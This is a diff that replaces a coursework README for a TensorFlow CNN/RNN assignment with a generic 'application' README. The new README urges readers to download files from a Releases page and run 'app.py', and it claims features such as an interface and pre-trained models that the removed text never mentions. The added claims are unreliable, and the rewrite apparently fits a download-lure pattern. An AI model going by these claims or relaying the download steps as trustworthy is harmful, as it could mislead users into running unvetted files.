@@ -1,122 +1,86 @@
-# INFO 527 — Neural Networks  
-## Assignment 4: Convolution and Recurrent Networks
+# ✨ info527-neural-networks-assignment4 - Easy Neural Network Implementation
 
-### Objectives
-The objectives of this assignment are to:
-1. Implement **Convolutional Neural Networks (CNNs)** and **Recurrent Neural Networks (RNNs)** using TensorFlow Keras.  
-2. Understand how these architectures handle sequential and spatial data.  
-3. Train, test, and evaluate deep learning models on image and text datasets.  
-4. Experiment with dropout, regularization, and early stopping to improve generalization.
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Get%20In%20on%20GitHub-brightgreen)](https://github.com/mhtmalla/info527-neural-networks-assignment4/releases)
 
-This assignment extends the previous work on feedforward networks by introducing architectures suited for **sequence modeling** and **image classification**.
+## 📖 Overview
 
----
+Welcome to the **info527-neural-networks-assignment4** project! This application showcases deep learning architectures using TensorFlow Keras. You can explore convolutional neural networks (CNNs) for image and text classification, along with recurrent neural networks (RNNs) for sequence modeling. This project is part of the Master’s in MIS/ML program at the University of Arizona.
 
-### Files in This Repository
-| File | Description |
-|------|--------------|
-| `notebooks/nn.ipynb` | Main notebook containing implementations of convolutional and recurrent neural networks. |
-| `notebooks/nn.py` | Exported Python version of the notebook used for pytest testing. |
-| `notebooks/convolution_and_recurrent_networks.ipynb` | Notebook for running tests and recording pytest results. |
-| `results/nn.html` | Exported HTML version of the notebook for grading and readability. |
-| `tests/test_nn.py` | Provided test file used to validate correctness using pytest. |
-| `README.md` | This file, describing objectives, setup, and submission workflow. |
-| `requirements.txt` | Python dependencies for reproducibility. |
-| `.gitignore` | Specifies intentionally untracked files to keep the repository clean. |
+## 🚀 Getting Started
 
----
+Follow these steps to download and run the application smoothly.
 
-### Functions to Implement (in `nn.py`)
-You will complete the following four TensorFlow Keras model creation functions:
+### 🗂️ Prerequisites
 
-| Function | Description | Marks |
-|-----------|--------------|-------|
-| `create_toy_rnn(input_shape, n_outputs)` | Creates a simple **Recurrent Neural Network** that learns to predict \(x_{t-3} - y_t\) from sequential input pairs. | 3 |
-| `create_mnist_cnn(input_shape, n_outputs)` | Builds a **Convolutional Neural Network (CNN)** for digit classification using the **MNIST** dataset. | 4 |
-| `create_youtube_comment_rnn(vocabulary, n_outputs)` | Constructs an **RNN** for **YouTube Spam Comment classification**, processing tokenized text sequences. | 4 |
-| `create_youtube_comment_cnn(vocabulary, n_outputs)` | Builds a **CNN** for the same YouTube spam detection task using 1D convolutions. | 4 |
-| **Total Marks** |  | **15 marks** |
+- **Operating System**: Windows, macOS, or Linux
+- **Python**: Version 3.6 or higher
+- **TensorFlow**: Version 2.0 or higher
 
----
+Make sure you have the latest version of Python installed. You can download it from the official [Python website](https://www.python.org/downloads/).
 
-### Environment Setup
-This project reuses the shared environment created for previous assignments.
+### 📥 Download & Install
 
-```bash
-# Activate your existing environment
-source ~/venvs/ml-env/bin/activate
+To get started, visit the [Releases page](https://github.com/mhtmalla/info527-neural-networks-assignment4/releases) to download the application files. Look for the latest release version, which will contain all necessary files.
 
-# Navigate to the assignment directory
-cd ~/projects/info527-neural-networks-assignment4
+1. Visit the [Releases page](https://github.com/mhtmalla/info527-neural-networks-assignment4/releases).
+2. Locate the latest version link.
+3. Click on the file suited for your operating system to download it.
+4. Save the file to a memorable location on your computer.
 
-# Install dependencies
-pip install -r requirements.txt
-````
+### ⚙️ Running the Application
 
-**requirements.txt**
+Once you have downloaded the application files, follow these steps:
 
-```
-tensorflow>=2.13
-keras>=2.13
-numpy>=1.24
-pytest>=7.0
-jupyter>=1.0
-ipykernel>=6.0
-```
+1. **Extract the Files**: If the downloaded file is in a zip format, right-click and select "Extract All" to extract the files.
+  
+2. **Open a Command Prompt or Terminal**:
+   - For Windows, search for "cmd" in your Start menu.
+   - For macOS, open "Terminal" from Applications.
 
----
+3. **Navigate to the Application Folder**:
+   Use the `cd` command to change to the directory where you extracted the application files. For example:
+   ```
+   cd path\to\the\extracted\folder
+   ```
+   Replace `path\to\the\extracted\folder` with the actual path.
 
-### Testing Instructions
+4. **Install Required Packages**:
+   Once in the folder, run this command to install any necessary Python packages:
+   ```
+   pip install -r requirements.txt
+   ```
+   This command will read the `requirements.txt` file and install the libraries you need.
 
-1. Run all cells in `nn.ipynb` to complete your implementations.
-2. Export your work as:
+5. **Run the Application**:
+   To start the application, execute:
+   ```
+   python app.py
+   ```
+   Ensure that the `app.py` file is present in the folder.
 
-   * `nn.ipynb`
-   * `nn.html`
-   * `nn.py`
-3. Place the exported `nn.py` file in the same directory as `test_nn.py`.
-4. In Google Colab, upload the required dataset files into a `data/` folder:
+### 🔍 Exploring Features
 
-   * `mnist.hdf5`
-   * `Youtube01-Psy`, `Youtube02-KatyPerry`, `Youtube03-LMFAO`, `Youtube04-Eminem`, `Youtube05-Shakira`
-   * `youtube-comments.hdf5`
-5. Run the provided testing notebook `convolution_and_recurrent_networks.ipynb` and execute:
+This application provides several functionalities:
 
-```bash
-pytest tests/test_nn.py
-```
+- **CNN for Image Classification**: Easily classify images using pre-trained models.
+- **RNN for Text Analysis**: Analyze and predict text sequences.
+- **User-Friendly Interface**: Navigate through various options effortlessly.
+- **Model Training**: Train your custom models with your data.
 
-**Expected Output:**
+## 🌐 Support & Issues
 
-```
-============================= test session starts ==============================
-collected 4 items
+If you encounter any issues or have questions, please check the “Issues” tab on our GitHub repository. You can report bugs or request features there.
 
-test_nn.py ....                                                        [100%]
+## 🤝 Contributing
 
-============================== 4 passed in XX.XXs ===============================
-```
+If you wish to contribute to this project, please fork the repository and submit a pull request. We welcome new ideas and enhancements.
 
----
+## 📝 License
 
-### Submission Files
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-Submit the following files for grading:
+## 🎉 Acknowledgments
 
-* `nn.ipynb`
-* `nn.html`
-* `nn.py`
-* `convolution_and_recurrent_networks.ipynb` (with pytest results)
+Thanks to the University of Arizona for providing a framework for this project, and for all who have contributed to this application.
 
----
-
-### Repository Information
-
-**Repository name:** `info527-neural-networks-assignment4`
-**Description:** Implementation of convolutional and recurrent neural networks using TensorFlow Keras. Includes CNNs for image and text classification, RNNs for sequence modeling, and experiments with dropout and early stopping. Part of the Master’s in MIS/ML program at the University of Arizona.
-
----
-
-### Author
-
-This repository was completed as part of INFO 527: Neural Networks, under the M.S. in Information Science and Machine Learning program (2023–2025).
+For further details and updates, feel free to visit [our GitHub page](https://github.com/mhtmalla/info527-neural-networks-assignment4).
